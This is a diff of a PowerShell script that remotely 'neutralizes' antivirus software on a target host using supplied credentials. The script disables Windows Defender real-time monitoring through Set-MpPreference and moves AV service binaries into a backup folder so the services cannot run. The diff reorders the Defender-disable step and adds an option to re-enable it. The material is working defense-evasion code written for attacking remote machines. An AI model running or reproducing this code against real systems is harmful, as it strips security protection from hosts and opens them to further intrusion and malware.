@@ -38,11 +38,6 @@ foreach ($i in $AVServices){
 $SvcPath = $i | foreach { $_.pathToSignedReportingExe }
 $AVName = $i | foreach { $_.displayName }
 
-# Disable Real-Time Protection in Windows Defender Temporarily if Detected
-If ($AVName -eq 'Windows Defender'){
-Invoke-Command -ComputerName $Target -ScriptBlock {Set-MpPreference -DisableRealtimeMonitoring $true} -credential $cred
-}
-
 $SvcDirectory = Split-Path -Path $SvcPath
 
 # If Disabling AV, Create Backup Directory
@@ -50,6 +45,11 @@ If ($Chosenaction -eq 'Disable' -Or $Chosenaction -eq 'D' -Or $Chosenaction -eq 
 if (-not ([string]::IsNullOrEmpty($AVName)))
 {
 Write-Host "Found $AVName on $Target.. Attempting Neutralization.."
+}
+
+# Disable Real-Time Protection in Windows Defender Temporarily if Detected
+If ($AVName -eq 'Windows Defender'){
+Invoke-Command -ComputerName $Target -ScriptBlock {Set-MpPreference -DisableRealtimeMonitoring $true} -credential $cred
 }
 
 Invoke-Command -ComputerName $Target -ScriptBlock {New-Item -ItemType directory -Path $args[0] | Out-Null} -credential $cred -ArgumentList $SvcDirectory"BACKUP"
@@ -65,6 +65,11 @@ Invoke-Command -ComputerName $Target -ScriptBlock {Move-Item -Path ($args[0] + "
 # If Enabling AV, Move Service Files Back to Parent Directory From "BACKUP"
 If ($Chosenaction -eq 'Enable' -Or $Chosenaction -eq 'E' -Or $Chosenaction -eq 'enable' -Or $Chosenaction -eq 'e' -And $AVName -ne 'Windows Defender'){
 Write-Host "Moving AV Service Binaries back from $SvcDirectory"BACKUP" to $SvcDirectory on $Target"
+
+# Enable Real-Time Protection in Windows Defender if Detected
+If ($AVName -eq 'Windows Defender'){
+Invoke-Command -ComputerName $Target -ScriptBlock {Set-MpPreference -DisableRealtimeMonitoring $false} -credential $cred
+}
 
 Invoke-Command -ComputerName $Target -ScriptBlock {Move-Item -Path ($args[0] + "BACKUP\*") -Destination ($args[0] + "\") -Force} -credential $cred -ArgumentList $SvcDirectory
 
